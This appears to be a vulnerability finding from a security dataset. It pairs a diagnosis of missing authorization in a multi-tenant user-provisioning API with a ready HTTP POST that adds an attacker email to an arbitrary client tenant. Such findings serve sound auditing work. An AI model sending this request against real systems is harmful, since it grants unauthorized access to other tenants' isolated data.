diagnosis: The view accepts tenant_slug and user email from the request body and calls tenant.add_user() without verifying that request.user is an owner or administrator of the target ClientTenant. Any authenticated user can provision their own account or rogue accounts into arbitrary client tenant schemas, gaining access to isolated PostgreSQL schema data.
exploit_request:
POST /api/provisioning/tenant-users/ HTTP/1.1
Host: multitenant.enterprise-erp.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"tenant_slug": "fintech-client-corp", "email": "attacker@evil-domain.com"}
